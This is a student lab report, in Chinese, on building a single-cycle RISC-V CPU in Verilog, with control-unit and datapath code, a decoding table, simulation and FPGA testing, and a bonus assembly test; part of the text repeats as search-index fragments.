\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab5-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.27 ~ 2022.06.21\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u5b8c\u6210\u63a7\u5236\u5355\u5143\u6a21\u5757\u8bbe\u8ba1 \u7ed3\u5408\u6570\u636e\u901a\u8def\uff0c\u642d\u8d77\u5355\u5468\u671f CPU \u4f7f\u7528 lab5-1 \u7684\u4eff\u771f\u4ee3\u7801\u6587\u4ef6\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528 lab5-1 \u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1 bonus\uff1a\u6307\u4ee4\u6269\u5c55 \u5b9e\u73b0 andi ori and or sll \u5b9e\u73b0 xori slli srli srl \u5b9e\u73b0 auipc sltu jalr \u63a7\u5236\u5355\u5143\u6a21\u5757\u8bbe\u8ba1 \u00b6 \u76f4\u63a5\u4ee5 bonus \u4e3a\u76ee\u6807\u8fdb\u884c\u8bbe\u8ba1\uff0c\u5b8c\u6210\u8fd9 22 \u4e2a\u6307\u4ee4 \uff1alw sw bne beq jal lui addi add slt slti andi ori and or sll xori slli srli srl auipc sltu jalr \u660e\u786e\u76ee\u6807 \u00b6 \u76ee\u6807\u5373\u7f16\u5199 lab5-1 \u4e2d\u7ed9\u51fa\u7684 Control.v \u4e2d\u7684 Control \u6a21\u5757\u7684\u7f16\u5199\uff0c\u5176\u529f\u80fd\u5c31\u662f\u63a5\u6536\u6307\u4ee4\u5e76\u8bd1\u7801\uff0c\u89e3\u6790\u51fa\u4e00\u7cfb\u5217\u6570\u636e\u901a\u8def\u4e2d\u4f1a\u7528\u5230\u7684\u503c\u3002\u5176\u8f93\u5165\u8f93\u51fa\u90e8\u5206\uff1a module Control ( input [ 6 : 0 ] op_code , input [ 2 : 0 ] funct3 , input funct7_5 , output [ 1 : 0 ] pc_src , output reg_write , output alu_src_b , output [ 3 : 0 ] alu_op , output [ 1 : 0 ] mem_to_reg , output mem_write , output branch , output b_type , output auipc ; ); \u8f93\u5165\u4e3a RISC-V 32 \u4f4d\u6307\u4ee4\u7684\u4e09\u4e2a\u90e8\u5206\uff0cop_code \u4e3a\u4f4e 7 \u4f4d\u7684\u64cd\u4f5c\u7801\uff0cfunct3 \u4e3a inst[14:12] \u7684\u529f\u80fd\u90e8\u5206\uff0cfunct7_5 \u4e3a funct7 \u7684\u7b2c\u4e94\u4f4d\u4e5f\u5c31\u662f inst[30] \u8f93\u51fa\u4e3a\u8bd1\u7801\u5f97\u5230\u7684\u4e00\u4e9b\u7ed3\u679c\uff1a pc_src\uff1apc \u6765\u6e90\uff0c00 \u6765\u81ea pc+4\u300101 \u6765\u81ea JALR\u300110 \u6765\u81ea JAL reg_write\uff1a\u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668\u7ec4 alu_src_b\uff1aALUsrc\uff0c0 \u8868\u793a ALU \u7684\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u6765\u81ea\u5bc4\u5b58\u5668\uff0c1 \u8868\u793a\u6765\u81ea\u7acb\u5373\u6570 alu_op\uff1aALU \u8fdb\u884c\u7684\u64cd\u4f5c\u7b26\uff0c\u5728 AluOp.vh \u4e2d\u5b9a\u4e49 mem_to_reg\uff1a\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e\u6765\u6e90\uff0c00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU\u300101 \u6765\u81ea\u7acb\u5373\u6570\u300110 \u6765\u81ea pc+4\u300111 \u6765\u81ea data memory mem_write\uff1a\u662f\u5426\u5199\u5165 data memory\uff0c0 \u8868\u793a\u8bfb\uff0c1 \u8868\u793a\u5199 branch\uff1a\u6307\u4ee4\u662f\u5426\u662f branch \u5206\u652f\u64cd\u4f5c\uff0c1 \u8868\u793a\u662f\uff0c0 \u4e0d\u662f b_type\uff1a\u5206\u652f\u64cd\u4f5c\u7c7b\u578b\uff0c0 \u8868\u793a bne\u30011 \u8868\u793a beq \u6b64\u5916\uff0c\u6211\u589e\u52a0\u4e86\u4e00\u4e2a auipc \u7684\u8f93\u51fa\u6765\u663e\u793a\u5f53\u524d\u6307\u4ee4\u662f\u5426\u4e3a auipc\uff0c\u4f7f Datapath \u4e2d\u505a\u7279\u6b8a\u5904\u7406\u3002 \u5269\u4f59\u90e8\u5206\u51e0\u4e4e\u4e0e lab5-1 \u4e00\u81f4\uff0c\u53ea\u9700\u8981\u66ff\u6362 Control.v \u6587\u4ef6\u5e76\u505a\u4e00\u4e9b\u76f8\u5e94\u7684\u9002\u914d\u6027\u66f4\u6539\u5373\u53ef\u3002 \u6307\u4ee4\u5206\u6790 \u00b6 \u5c06\u6240\u9700\u8981\u5b9e\u73b0\u7684 22 \u4e2a\u6307\u4ee4\u6839\u636e opcodes \u5206\u7c7b\uff1a(\u4e0b\u8868\u4e2d ps \u4ee3\u8868 pc_src\uff0crw \u4ee3\u8868 reg_write\uff0cas \u4ee3\u8868 alu_src_b\uff0cop \u4ee3\u8868 alu_op\uff0cmtr \u4ee3\u8868 mem_to_reg\uff0cmw \u4ee3\u8868 mem_write\uff0cb \u4ee3\u8868 branch\uff0cbt \u4ee3\u8868 b_type\uff0c\u7a7a\u683c\u8868\u793a\u4e0d\u9700\u8981\u8003\u8651\uff0c- \u8868\u793a\u5728\u4e0b\u9762\u5199) .md-typeset table:not([class]) th { min-width: 0; } opcode \u6307\u4ee4 ps rw as op mtr mw b bt auipc 0000011 lw 0 1 1 ADD 11 0 0 0 0100011 sw 0 0 1 ADD 0 1 0 0 0010011 addi slti xori ori andi slli srli 0 1 1 - 0 0 0 0 1100011 bne beq 0 0 0 XOR 0 0 1 - 0 1101111 jal 10 1 10 0 0 0 0110111 lui 0 1 10 0 0 0 0110011 add slt and or sll srl sltu 0 1 0 - 0 0 0 0 0010111 auipc 0 1 1 ADD 0 0 0 1 1100111 jalr 1 1 1 ADD 10 0 0 0 \u5bf9\u4e8e 0010011 \u7684\u4e00\u7cfb\u5217 I \u578b\u6307\u4ee4\uff0c\u9700\u8981\u901a\u8fc7\u5224\u65ad funct3 \u6765\u786e\u5b9a alu_op\u3002\u5bf9\u4e8e 0110011 \u7684\u4e00\u7cfb\u5217 R \u578b\u6307\u4ee4\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 {funct7_5, funct3} \u4f5c\u4e3a alu_op\u3002\u5bf9\u4e8e bne \u548c beq\uff0c\u5176 b_type \u5c31\u662f ~funct3[0]\u3002 \u63a7\u5236\u5355\u5143\u6a21\u5757\u4ee3\u7801 \u00b6 \u901a\u8fc7\u524d\u9762\u7684\u5206\u6790\uff0c\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u63a7\u5236\u5355\u5143\u7684\u4ee3\u7801\uff1a `timescale 1 ns / 1 ps module Control ( input [ 6 : 0 ] op_code , input [ 2 : 0 ] funct3 , input funct7_5 , output reg [ 1 : 0 ] pc_src , // 00 pc+4 01 JALR 10 JAL output reg reg_write , // 1 \u5199\u5165\u5bc4\u5b58\u5668 output reg alu_src_b , // 0 \u6765\u81ea\u5bc4\u5b58\u5668 1 \u6765\u81ea\u7acb\u5373\u6570 output reg [ 3 : 0 ] alu_op , // ALUop output reg [ 1 : 0 ] mem_to_reg , // 00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU 01 \u6765\u81ea\u7acb\u5373\u6570 10 \u6765\u81ea pc+4 11 \u6765\u81ea data memory output reg mem_write , // 0 \u8bfb memory\uff0c1 \u5199 output reg branch , // 1 \u662f branch 0 \u4e0d\u662f output reg b_type , // 1 \u662f beq 0 \u662f bne output reg auipc // 1 \u662f auipc \u6307\u4ee4 ); `include \"AluOp.vh\" always @( * ) begin pc_src = 0 ; reg_write = 0 ; alu_src_b = 0 ; alu_op = { funct7_5 , funct3 }; mem_to_reg = 0 ; mem_write = 0 ; branch = 0 ; b_type = 0 ; auipc = 0 ; case ( op_code ) 7 'b0000011 : begin // lw reg_write = 1 ; alu_src_b = 1 ; alu_op = ADD ; mem_to_reg = 2 'b11 ; end 7 'b0100011 : begin // sw alu_src_b = 1 ; alu_op = ADD ; mem_write = 1 ; end 7 'b0010011 : begin // addi slti xori ori andi slli srli reg_write = 1 ; alu_src_b = 1 ; case ( funct3 ) 3 'b000 : alu_op = ADD ; 3 'b010 : alu_op = SLT ; 3 'b100 : alu_op = XOR ; 3 'b110 : alu_op = OR ; 3 'b111 : alu_op = AND ; 3 'b001 : alu_op = SLL ; 3 'b101 : begin if ( funct7_5 ) alu_op = SRA ; else alu_op = SRL ; end endcase end 7 'b1100011 : begin // bne beq alu_op = XOR ; branch = 1 ; b_type = ~ funct3 [ 0 ]; end 7 'b1101111 : begin // jal pc_src = 2 'b10 ; reg_write = 1 ; mem_to_reg = 2 'b10 ; end 7 'b0110111 : begin // lui reg_write = 1 ; mem_to_reg = 2 'b01 ; end 7 'b0110011 : begin // add slt and or sll srl sltu reg_write = 1 ; end 7 'b0010111 : begin // auipc reg_write = 1 ; alu_src_b = 1 ; alu_op = ADD ; auipc = 1 ; end 7 'b1100111 : begin // jalr pc_src = 2 'b01 ; reg_write = 1 ; mem_to_reg = 2 'b10 ; alu_src_b = 1 ; alu_op = ADD ; end endcase end endmodule \u5176\u5b83\u6587\u4ef6\u4e2d\u7684\u4fee\u6539 \u00b6 ImmGen \u6a21\u5757\u5728\u4e0a\u4e00\u6b21 lab \u4e2d\u5c31\u5b9e\u73b0\u4e86\u5bf9\u4e8e\u8fd9 22 \u4e2a\u6307\u4ee4\u7684\u8bc6\u522b\uff0c\u4e0d\u9700\u8981\u66f4\u6539\u3002SCPU \u6a21\u5757\u4e2d\u53ea\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a wire auipc \u7136\u540e\u8fde\u63a5 Control \u548c Datapath \u7684 auipc \u63a5\u53e3\u5373\u53ef\u3002Core \u6a21\u5757\u53ca\u66f4\u9ad8\u5c42\u7684\u65e0\u9700\u66f4\u6539\u3002 \u56e0\u4e3a sll slli srl srli \u8fd9\u4e9b\u79fb\u4f4d\u7684\u6307\u4ee4\u79fb\u7684\u4f4d\u6570\u90fd\u662f\u53d6\u4f4e 5 \u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u6539\u4e00\u4e0b ALU \u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u8fdb\u884c SLL \u548c SRL\uff08\u5305\u62ec SRA\uff09\u65f6\u53d6 b[4:0] \u8fdb\u884c\u8fd0\u7b97\uff0c\u5373\uff1a ... ... SLL: res <= a << b [ 4 : 0 ]; ... SRL: res <= a >> b [ 4 : 0 ]; SRA: res <= a >>> b [ 4 : 0 ]; ... ... Datapath \u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u66f4\u6539\uff1a \u5bf9\u4e8e ALU \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u8fdb\u884c\u4e00\u4e0b\u9009\u62e9\uff0c\u5982\u679c auipc \u4e3a 0 \u5219\u539f\u6837\u9009\u62e9 read_data_1\uff0c\u4e3a 1 \u5219\u9009\u62e9 pc \u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570 PC \u7684\u9009\u62e9\u5668\u8f93\u5165\u5bf9 jal \u548c jalr \u8fdb\u884c\u533a\u5206\uff0cjalr \u5bf9\u5e94\u7684\u5730\u5740\uff08\u5373\u56db\u8def\u9009\u62e9\u5668\u7684\u7b2c\u4e8c\u8def\uff09\u4e3a ALU \u7684\u7ed3\u679c\uff0cjal \u548c branch \u5bf9\u5e94\u7684\u5730\u5740\uff08\u4e09\u56db\u8def\uff09\u4ecd\u4e3a pc+imm \u66f4\u6539\u540e\u7684 Datapath \u6a21\u5757\uff1a `timescale 1 ns / 1 ps module Datapath ( input clk , input rst , input [ 1 : 0 ] pc_src , input reg_write , input alu_src_b , input branch , input b_type , input auipc , input [ 3 : 0 ] alu_op , input [ 1 : 0 ] mem_to_reg , input [ 31 : 0 ] inst_in , input [ 31 : 0 ] data_in , output [ 31 : 0 ] addr_out , output [ 31 : 0 ] data_out , output [ 31 : 0 ] pc_out , input [ 4 : 0 ] debug_reg_addr , output [ 31 : 0 ] debug_reg ); reg [ 31 : 0 ] pc ; wire [ 31 : 0 ] pc_next ; wire [ 31 : 0 ] write_data , read_data_1 , read_data_2 ; wire [ 31 : 0 ] alu_data_1 , alu_data_2 , alu_result ; wire alu_zero ; wire [ 31 : 0 ] imm ; wire [ 31 : 0 ] jal_addr , jalr_addr ; assign pc_out = pc ; assign addr_out = alu_result ; assign data_out = read_data_2 ; always @( posedge clk or posedge rst ) begin if ( rst ) begin pc <= 32 'b0 ; end else begin pc <= pc_next ; end end Regs regs ( . clk ( clk ), . rst ( rst ), . we ( reg_write ), . read_addr_1 ( inst_in [ 19 : 15 ]), . read_addr_2 ( inst_in [ 24 : 20 ]), . write_addr ( inst_in [ 11 : 7 ]), . write_data ( write_data ), . read_data_1 ( read_data_1 ), . read_data_2 ( read_data_2 ), . debug_reg_addr ( debug_reg_addr ), . debug_reg ( debug_reg ) ); ImmGen immgen ( . inst ( inst_in ), . imm ( imm ) ); Mux2x32 mux2x32_1 ( . I0 ( read_data_1 ), . I1 ( pc ), . s ( auipc ), . o ( alu_data_1 ) ); Mux2x32 mux2x32_2 ( . I0 ( read_data_2 ), . I1 ( imm ), . s ( alu_src_b ), . o ( alu_data_2 ) ); ALU alu ( . a ( alu_data_1 ), . b ( alu_data_2 ), . alu_op ( alu_op ), . res ( alu_result ), . zero ( alu_zero ) ); Mux4x32 mux4x32 ( . I0 ( alu_result ), . I1 ( imm ), . I2 ( pc + 4 ), . I3 ( data_in ), . s ( mem_to_reg ), . o ( write_data ) ); assign jal_addr = pc + imm ; assign jalr_addr = alu_result ; MuxPC mux_pc ( . I0 ( pc + 4 ), . I1 ( jalr_addr ), . I2 ( jal_addr ), . I3 ( jal_addr ), . s ( pc_src ), . branch ( branch ), . b_type ( b_type ), . alu_res ( alu_result ), . o ( pc_next ) ); endmodule \u8fd9\u6837\u4fee\u6539\u540e\u6574\u4e2a\u5355\u5468\u671f CPU \u5c31\u5b8c\u6574\u6b63\u786e\u8fde\u63a5\u4e86 \u4eff\u771f\u6d4b\u8bd5 \u00b6 \u4e0e lab5-1 \u540c\u7406\uff0c\u8f7d\u5165 lab10_all.coe \u6587\u4ef6\uff0c\u9009\u62e9 Core_tb.sv \u4e3a\u76ee\u6807\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u518d\u901a\u8fc7\u8c03\u6574\u5f97\u5230\u5168\u90e8\u4e2d\u95f4\u53d8\u91cf\uff08\u5bc4\u5b58\u5668\u7ec4\u503c\u3001ALU \u8f93\u5165\u8f93\u51fa\u3001Mux \u8f93\u5165\u8f93\u51fa\u7b49\uff09\u5f97\u5230\u4eff\u771f\u6ce2\u5f62\uff1a \u4ee5\u53ca pc \u548c\u5bc4\u5b58\u5668\u7684\u6ce2\u5f62\u6570\u636e\uff1a \u901a\u8fc7\u4ed4\u7ec6\u5206\u6790\u6bcf\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\u4e0e\u6240\u6709\u503c\u7684\u53d8\u5316\u3001\u5bc4\u5b58\u5668\u7684\u53d8\u5316\u53ef\u4ee5\u770b\u51fa CPU \u6309\u7167\u7ed9\u51fa\u7684\u6307\u4ee4\u6b63\u786e\u8fd0\u884c\u4e86\u3002\u884c\u4e3a\u5747\u4e0e lab5-1 \u4e00\u81f4\u3002 \u4e0a\u677f\u9a8c\u8bc1 \u00b6 \u5728 vivado \u4e2d disable \u6389 Control_sim.v \u6587\u4ef6\uff08\u5373\u4f7f\u7528 Control.v \u548c Control.edf\uff09\u7136\u540e\u901a\u8fc7 Top.\u200csv \u4e2d\u9876\u5c42\u6a21\u5757\u751f\u6210\u6bd4\u7279\u6d41\uff0c\u5199\u5165 FPGA \u5f00\u53d1\u7248\u5373\u53ef\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1\u3002 \u901a\u8fc7\u5355\u6b65\u8fd0\u884c\uff0c\u89c2\u5bdf pc\u3001inst\u3001\u5bc4\u5b58\u5668\u503c\u53ef\u4ee5\u786e\u5b9a\u4e0a\u677f\u4e5f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002\u884c\u4e3a\u5747\u4e0e lab5-1 \u4e00\u81f4\u3002 Bonus \u00b6 Bonus \u8303\u56f4\u7684\u6307\u4ee4\u5728\u524d\u9762\u8bbe\u8ba1\u63a7\u5236\u5355\u5143\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u8003\u8651\u4e86\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u6d4b\u8bd5\u8fd9\u4e9b\u6307\u4ee4\u5373\u53ef\u3002\u7b80\u5355\u5199\u4e86\u4e00\u4e2a\u5305\u542b\u8fd9\u4e9b\u6307\u4ee4\u7684 RISC-V \u6c47\u7f16\u6587\u4ef6\uff1a .section .text .globl _start _start: addi x1 , x0 , 123 # x1 = 123 andi x2 , x1 , 456 # x2 = 72 ori x3 , x2 , 789 # x3 = 861 and x4 , x3 , x1 # x4 = 89 addi x5 , x0 , 234 # x5 = 234 or x5 , x4 , x5 # x5 = 251 (0xfb) sll x6 , x5 , x2 # x6 = 64256 (0xFB00) xori x7 , x6 , 123 # x7 = 64379 (0xFB7B) slli x8 , x7 , 4 # x8 = 1030064 (0xFB7B0) srli x9 , x8 , 8 # x9 = 4023 (0xFB7) srl x10 , x8 , x2 # x10 = 4023 (0xFB7) auipc x11 , 0xFFF # x11 = 0xFFF02C addi x12 , x0 , -1 # x12 = -1 sltu x12 , x11 , x12 # x12 = 1 jalr x13 , 63 ( x12 ) # x13 = 60 addi x14 , x0 , 1 # won't exec Label: addi x15 , x0 , 1 \u4f7f\u7528 riscv32-unknown-linux-gnu-c++ -nostdlib -nostdinc -static -g bonus.s -o bonus.elf -march=rv32i -mabi=ilp32 \u6765\u7f16\u8bd1\u51fa\u6307\u4ee4\u96c6\u5728 RV32I \u8303\u56f4\u5185\u7684 ELF \u6587\u4ef6\uff0c\u518d objdump\uff1a 00010074 <_start>: 10074: 07b00093 li ra,123 10078: 1c80f113 andi sp,ra,456 1007c: 31516193 ori gp,sp,789 10080: 0011f233 and tp,gp,ra 10084: 0ea00293 li t0,234 10088: 005262b3 or t0,tp,t0 1008c: 00229333 sll t1,t0,sp 10090: 07b34393 xori t2,t1,123 10094: 00439413 slli s0,t2,0x4 10098: 00845493 srli s1,s0,0x8 1009c: 00245533 srl a0,s0,sp 100a0: 00fff597 auipc a1,0xfff 100a4: fff00613 li a2,-1 100a8: 00c5b633 sltu a2,a1,a2 100ac: 03f606e7 jalr a3,63(a2) 100b0: 00100713 li a4,1 000100b4 <Label>: 100b4: 00100793 li a5,1 \u5f97\u5230\u673a\u5668\u7801\uff0c\u5373 coe \u6587\u4ef6\u5185\u5bb9\uff1a memory_initialization_radix = 16; memory_initialization_vector = 07b00093, 1c80f113, 31516193, 0011f233, 0ea00293, 005262b3, 00229333, 07b34393, 00439413, 00845493, 00245533, 00fff597, fff00613, 00c5b633, 03f606e7, 00100713, 00100793; \u8f7d\u5165 ROM \u5185\uff0c\u8fdb\u884c\u4eff\u771f\uff0c\u5f97\u5230\u6ce2\u5f62\u4ee5\u53ca\u5bc4\u5b58\u5668\u5185\u5bb9\u53d8\u5316\uff1a \u901a\u8fc7\u5206\u6790 pc\u3001\u4e2d\u95f4\u503c\u7b49\u4ee5\u53ca\u548c\u6c47\u7f16\u4ee3\u7801\u5b9e\u9645\u6548\u679c\uff08\u6ce8\u91ca\u91cc\u5199\u4e86\uff09\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e9b bonus \u6307\u4ee4\u90fd\u6b63\u5e38\u6267\u884c\u4e86\u3002\u4e0a\u677f\u6d4b\u8bd5\u4e5f\u6ca1\u6709\u95ee\u9898\u3002 \u9644\uff1a\u5355\u5468\u671f CPU \u8bbe\u8ba1\u56fe \u00b6 \u5b9e\u9645\u4f7f\u7528\u7684\u5355\u5468\u671f CPU \u8bbe\u8ba1\u56fe\u5982\u4e0b\uff1a","title":"\u7cfb\u7edf I lab5-2"},{"location":"cs/system/cs1/lab5-2/#cpu","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab5-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.27 ~ 2022.06.21\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u5355\u5468\u671f CPU \u8bbe\u8ba1"},{"location":"cs/system/cs1/lab5-2/#_1","text":"\u5b8c\u6210\u63a7\u5236\u5355\u5143\u6a21\u5757\u8bbe\u8ba1 \u7ed3\u5408\u6570\u636e\u901a\u8def\uff0c\u642d\u8d77\u5355\u5468\u671f CPU \u4f7f\u7528 lab5-1 \u7684\u4eff\u771f\u4ee3\u7801\u6587\u4ef6\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528 lab5-1 \u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1 bonus\uff1a\u6307\u4ee4\u6269\u5c55 \u5b9e\u73b0 andi ori and or sll \u5b9e\u73b0 xori slli srli srl \u5b9e\u73b0 auipc sltu jalr","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab5-2/#_2","text":"\u76f4\u63a5\u4ee5 bonus \u4e3a\u76ee\u6807\u8fdb\u884c\u8bbe\u8ba1\uff0c\u5b8c\u6210\u8fd9 22 \u4e2a\u6307\u4ee4 \uff1alw sw bne beq jal lui addi add slt slti andi ori and or sll xori slli srli srl auipc sltu jalr","title":"\u63a7\u5236\u5355\u5143\u6a21\u5757\u8bbe\u8ba1"},{"location":"cs/system/cs1/lab5-2/#_3","text":"\u76ee\u6807\u5373\u7f16\u5199 lab5-1 \u4e2d\u7ed9\u51fa\u7684 Control.v \u4e2d\u7684 Control \u6a21\u5757\u7684\u7f16\u5199\uff0c\u5176\u529f\u80fd\u5c31\u662f\u63a5\u6536\u6307\u4ee4\u5e76\u8bd1\u7801\uff0c\u89e3\u6790\u51fa\u4e00\u7cfb\u5217\u6570\u636e\u901a\u8def\u4e2d\u4f1a\u7528\u5230\u7684\u503c\u3002\u5176\u8f93\u5165\u8f93\u51fa\u90e8\u5206\uff1a module Control ( input [ 6 : 0 ] op_code , input [ 2 : 0 ] funct3 , input funct7_5 , output [ 1 : 0 ] pc_src , output reg_write , output alu_src_b , output [ 3 : 0 ] alu_op , output [ 1 : 0 ] mem_to_reg , output mem_write , output branch , output b_type , output auipc ; ); \u8f93\u5165\u4e3a RISC-V 32 \u4f4d\u6307\u4ee4\u7684\u4e09\u4e2a\u90e8\u5206\uff0cop_code \u4e3a\u4f4e 7 \u4f4d\u7684\u64cd\u4f5c\u7801\uff0cfunct3 \u4e3a inst[14:12] \u7684\u529f\u80fd\u90e8\u5206\uff0cfunct7_5 \u4e3a funct7 \u7684\u7b2c\u4e94\u4f4d\u4e5f\u5c31\u662f inst[30] \u8f93\u51fa\u4e3a\u8bd1\u7801\u5f97\u5230\u7684\u4e00\u4e9b\u7ed3\u679c\uff1a pc_src\uff1apc \u6765\u6e90\uff0c00 \u6765\u81ea pc+4\u300101 \u6765\u81ea JALR\u300110 \u6765\u81ea JAL reg_write\uff1a\u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668\u7ec4 alu_src_b\uff1aALUsrc\uff0c0 \u8868\u793a ALU \u7684\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u6765\u81ea\u5bc4\u5b58\u5668\uff0c1 \u8868\u793a\u6765\u81ea\u7acb\u5373\u6570 alu_op\uff1aALU \u8fdb\u884c\u7684\u64cd\u4f5c\u7b26\uff0c\u5728 AluOp.vh \u4e2d\u5b9a\u4e49 mem_to_reg\uff1a\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e\u6765\u6e90\uff0c00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU\u300101 \u6765\u81ea\u7acb\u5373\u6570\u300110 \u6765\u81ea pc+4\u300111 \u6765\u81ea data memory mem_write\uff1a\u662f\u5426\u5199\u5165 data memory\uff0c0 \u8868\u793a\u8bfb\uff0c1 \u8868\u793a\u5199 branch\uff1a\u6307\u4ee4\u662f\u5426\u662f branch \u5206\u652f\u64cd\u4f5c\uff0c1 \u8868\u793a\u662f\uff0c0 \u4e0d\u662f b_type\uff1a\u5206\u652f\u64cd\u4f5c\u7c7b\u578b\uff0c0 \u8868\u793a bne\u30011 \u8868\u793a beq \u6b64\u5916\uff0c\u6211\u589e\u52a0\u4e86\u4e00\u4e2a auipc \u7684\u8f93\u51fa\u6765\u663e\u793a\u5f53\u524d\u6307\u4ee4\u662f\u5426\u4e3a auipc\uff0c\u4f7f Datapath \u4e2d\u505a\u7279\u6b8a\u5904\u7406\u3002 \u5269\u4f59\u90e8\u5206\u51e0\u4e4e\u4e0e lab5-1 \u4e00\u81f4\uff0c\u53ea\u9700\u8981\u66ff\u6362 Control.v \u6587\u4ef6\u5e76\u505a\u4e00\u4e9b\u76f8\u5e94\u7684\u9002\u914d\u6027\u66f4\u6539\u5373\u53ef\u3002","title":"\u660e\u786e\u76ee\u6807"},{"location":"cs/system/cs1/lab5-2/#_4","text":"\u5c06\u6240\u9700\u8981\u5b9e\u73b0\u7684 22 \u4e2a\u6307\u4ee4\u6839\u636e opcodes \u5206\u7c7b\uff1a(\u4e0b\u8868\u4e2d ps \u4ee3\u8868 pc_src\uff0crw \u4ee3\u8868 reg_write\uff0cas \u4ee3\u8868 alu_src_b\uff0cop \u4ee3\u8868 alu_op\uff0cmtr \u4ee3\u8868 mem_to_reg\uff0cmw \u4ee3\u8868 mem_write\uff0cb \u4ee3\u8868 branch\uff0cbt \u4ee3\u8868 b_type\uff0c\u7a7a\u683c\u8868\u793a\u4e0d\u9700\u8981\u8003\u8651\uff0c- \u8868\u793a\u5728\u4e0b\u9762\u5199) .md-typeset table:not([class]) th { min-width: 0; } opcode \u6307\u4ee4 ps rw as op mtr mw b bt auipc 0000011 lw 0 1 1 ADD 11 0 0 0 0100011 sw 0 0 1 ADD 0 1 0 0 0010011 addi slti xori ori andi slli srli 0 1 1 - 0 0 0 0 1100011 bne beq 0 0 0 XOR 0 0 1 - 0 1101111 jal 10 1 10 0 0 0 0110111 lui 0 1 10 0 0 0 0110011 add slt and or sll srl sltu 0 1 0 - 0 0 0 0 0010111 auipc 0 1 1 ADD 0 0 0 1 1100111 jalr 1 1 1 ADD 10 0 0 0 \u5bf9\u4e8e 0010011 \u7684\u4e00\u7cfb\u5217 I \u578b\u6307\u4ee4\uff0c\u9700\u8981\u901a\u8fc7\u5224\u65ad funct3 \u6765\u786e\u5b9a alu_op\u3002\u5bf9\u4e8e 0110011 \u7684\u4e00\u7cfb\u5217 R \u578b\u6307\u4ee4\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 {funct7_5, funct3} \u4f5c\u4e3a alu_op\u3002\u5bf9\u4e8e bne \u548c beq\uff0c\u5176 b_type \u5c31\u662f ~funct3[0]\u3002","title":"\u6307\u4ee4\u5206\u6790"},{"location":"cs/system/cs1/lab5-2/#_5","text":"\u901a\u8fc7\u524d\u9762\u7684\u5206\u6790\uff0c\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u63a7\u5236\u5355\u5143\u7684\u4ee3\u7801\uff1a `timescale 1 ns / 1 ps module Control ( input [ 6 : 0 ] op_code , input [ 2 : 0 ] funct3 , input funct7_5 , output reg [ 1 : 0 ] pc_src , // 00 pc+4 01 JALR 10 JAL output reg reg_write , // 1 \u5199\u5165\u5bc4\u5b58\u5668 output reg alu_src_b , // 0 \u6765\u81ea\u5bc4\u5b58\u5668 1 \u6765\u81ea\u7acb\u5373\u6570 output reg [ 3 : 0 ] alu_op , // ALUop output reg [ 1 : 0 ] mem_to_reg , // 00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU 01 \u6765\u81ea\u7acb\u5373\u6570 10 \u6765\u81ea pc+4 11 \u6765\u81ea data memory output reg mem_write , // 0 \u8bfb memory\uff0c1 \u5199 output reg branch , // 1 \u662f branch 0 \u4e0d\u662f output reg b_type , // 1 \u662f beq 0 \u662f bne output reg auipc // 1 \u662f auipc \u6307\u4ee4 ); `include \"AluOp.vh\" always @( * ) begin pc_src = 0 ; reg_write = 0 ; alu_src_b = 0 ; alu_op = { funct7_5 , funct3 }; mem_to_reg = 0 ; mem_write = 0 ; branch = 0 ; b_type = 0 ; auipc = 0 ; case ( op_code ) 7 'b0000011 : begin // lw reg_write = 1 ; alu_src_b = 1 ; alu_op = ADD ; mem_to_reg = 2 'b11 ; end 7 'b0100011 : begin // sw alu_src_b = 1 ; alu_op = ADD ; mem_write = 1 ; end 7 'b0010011 : begin // addi slti xori ori andi slli srli reg_write = 1 ; alu_src_b = 1 ; case ( funct3 ) 3 'b000 : alu_op = ADD ; 3 'b010 : alu_op = SLT ; 3 'b100 : alu_op = XOR ; 3 'b110 : alu_op = OR ; 3 'b111 : alu_op = AND ; 3 'b001 : alu_op = SLL ; 3 'b101 : begin if ( funct7_5 ) alu_op = SRA ; else alu_op = SRL ; end endcase end 7 'b1100011 : begin // bne beq alu_op = XOR ; branch = 1 ; b_type = ~ funct3 [ 0 ]; end 7 'b1101111 : begin // jal pc_src = 2 'b10 ; reg_write = 1 ; mem_to_reg = 2 'b10 